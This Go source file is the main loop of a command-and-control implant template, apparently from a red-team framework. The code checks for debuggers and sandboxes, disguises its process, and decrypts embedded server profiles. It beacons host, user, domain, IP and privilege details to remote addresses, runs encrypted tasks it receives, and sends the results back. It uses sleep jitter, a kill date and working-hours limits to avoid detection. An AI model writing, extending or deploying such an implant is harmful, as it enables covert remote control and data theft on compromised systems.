package main

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"os"
	"runtime"
	"sync"
	"time"

	"github.com/vmihailenco/msgpack/v5"

	"__NAME__/crypto"
	"__NAME__/impl"
	"__NAME__/protocol"
)

// ─── Global state ──────────────────────────────────────────────────────────────

var (
	agent impl.AgentImpl

	stateMu     sync.RWMutex
	agentSleep  int   // seconds
	agentJitter int   // 0-90 %
	killDate    int64 // unix timestamp; 0 = disabled
	workStart   int   // HHMM e.g. 900
	workEnd     int   // HHMM e.g. 1700
)

// ─── Entry point ───────────────────────────────────────────────────────────────

func main() {
	if len(encProfiles) == 0 {
		os.Exit(1)
	}

	// Create the agent implementation.
	agent = impl.New()

	// Anti-analysis: user-defined debugger/sandbox detection.
	if agent.IsDebugged() {
		os.Exit(0)
	}

	// Process masquerade: user-defined technique.
	agent.Masquerade()

	// Custom startup hook: user-defined initialization.
	agent.OnStart()

	// Try each embedded profile in order until one succeeds.
	for _, blob := range encProfiles {
		if len(blob) < 32 {
			continue
		}
		key := blob[:32]
		encData := blob[32:]

		plaintext, err := crypto.DecryptData(encData, key)
		if err != nil {
			continue
		}

		var profile protocol.Profile
		if err = msgpack.Unmarshal(plaintext, &profile); err != nil {
			continue
		}

		crypto.SKey = key
		initProfileState(&profile)
		run(&profile)
	}
}

// initProfileState seeds the global stealth state from the embedded profile.
func initProfileState(p *protocol.Profile) {
	stateMu.Lock()
	defer stateMu.Unlock()
	agentSleep = p.Sleep
	agentJitter = p.Jitter
	killDate = p.KillDate
	workStart = p.WorkStart
	workEnd = p.WorkEnd
}

// ─── Connection loop ───────────────────────────────────────────────────────────

func run(profile *protocol.Profile) {
	connCount := 0
	maxConn := profile.ConnCount

	for {
		if shouldExit() {
			os.Exit(0)
		}

		waitForWorkingHours()

		addr := profile.Addresses[connCount%len(profile.Addresses)]
		connCount++

		// Transport: user-defined Dial (default: TCP + optional TLS).
		conn, err := agent.Dial(addr, profile)
		if err != nil {
			sleepWithJitter()
			if maxConn > 0 && connCount >= maxConn {
				os.Exit(0)
			}
			continue
		}

		connCount = 0

		beat := createInfo(profile)
		beatData, err := msgpack.Marshal(beat)
		if err != nil {
			conn.Close()
			sleepWithJitter()
			continue
		}

		// InitPack: watermark (uint32 BE) + beat size (uint32 BE) + beat.
		hdr := make([]byte, 8)
		binary.BigEndian.PutUint32(hdr[0:4], uint32(profile.Type))
		binary.BigEndian.PutUint32(hdr[4:8], uint32(len(beatData)))
		if _, err = conn.Write(append(hdr, beatData...)); err != nil {
			conn.Close()
			sleepWithJitter()
			continue
		}

		taskLoop(conn)
		conn.Close()
		sleepWithJitter()
	}
}

func taskLoop(conn net.Conn) {
	for {
		if shouldExit() {
			return
		}
		waitForWorkingHours()

		data, err := protocol.RecvMsg(conn)
		if err != nil || data == nil {
			return
		}

		plaintext, err := crypto.DecryptData(data, crypto.SKey)
		if err != nil {
			return
		}

		var inMsg protocol.Message
		if err = msgpack.Unmarshal(plaintext, &inMsg); err != nil {
			return
		}

		responses := TaskProcess(inMsg.Object)
		if responses == nil {
			continue
		}

		respMsg := protocol.Message{Type: 0, Object: responses}
		packed, err := msgpack.Marshal(respMsg)
		if err != nil {
			return
		}

		enc, err := crypto.EncryptData(packed, crypto.SKey)
		if err != nil {
			return
		}

		if err = protocol.SendMsg(conn, enc); err != nil {
			return
		}

		sleepWithJitter()
	}
}

// ─── Registration ──────────────────────────────────────────────────────────────

func createInfo(p *protocol.Profile) protocol.SessionInfo {
	hostname, _ := os.Hostname()

	internalIP := ""
	if ifaces, err := net.Interfaces(); err == nil {
		for _, iface := range ifaces {
			if iface.Flags&net.FlagLoopback != 0 {
				continue
			}
			if addrs, err := iface.Addrs(); err == nil {
				for _, a := range addrs {
					if ipNet, ok := a.(*net.IPNet); ok && ipNet.IP.To4() != nil {
						internalIP = ipNet.IP.String()
						goto doneIP
					}
				}
			}
		}
	}
doneIP:

	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}

	domain := os.Getenv("USERDOMAIN")
	if domain == "" {
		domain = os.Getenv("HOSTNAME")
	}

	sleepStr := fmt.Sprintf("%ds", p.Sleep)

	return protocol.SessionInfo{
		Hostname:    hostname,
		Username:    username,
		Domain:      domain,
		InternalIP:  internalIP,
		Os:          runtime.GOOS,
		OsVersion:   agent.GetOsVersion(),
		OsArch:      runtime.GOARCH,
		Elevated:    agent.IsElevated(),
		ProcessId:   uint32(os.Getpid()),
		ProcessName: processName(),
		CodePage:    agent.GetCP(),
		Sleep:       sleepStr,
	}
}

func processName() string {
	exe, err := os.Executable()
	if err != nil {
		return "__NAME__"
	}
	for i := len(exe) - 1; i >= 0; i-- {
		if exe[i] == '/' || exe[i] == '\\' {
			return exe[i+1:]
		}
	}
	return exe
}

// ─── Stealth helpers ───────────────────────────────────────────────────────────

func sleepWithJitter() {
	stateMu.RLock()
	s := agentSleep
	j := agentJitter
	stateMu.RUnlock()

	if s <= 0 {
		s = 60
	}
	sleepMs := s * 1000
	if j > 0 {
		delta := int(float64(sleepMs) * float64(j) / 100.0)
		sleepMs += int(rand.Int63n(int64(delta*2+1))) - delta
		if sleepMs < 500 {
			sleepMs = 500
		}
	}
	time.Sleep(time.Duration(sleepMs) * time.Millisecond)
}

func shouldExit() bool {
	stateMu.RLock()
	kd := killDate
	stateMu.RUnlock()
	if kd == 0 {
		return false
	}
	return time.Now().Unix() >= kd
}

func waitForWorkingHours() {
	for {
		stateMu.RLock()
		ws := workStart
		we := workEnd
		stateMu.RUnlock()

		if ws == 0 && we == 0 {
			return
		}

		now := time.Now()
		hhmm := now.Hour()*100 + now.Minute()

		if ws <= we {
			if hhmm >= ws && hhmm < we {
				return
			}
		} else {
			if hhmm >= ws || hhmm < we {
				return
			}
		}

		time.Sleep(60 * time.Second)
	}
}
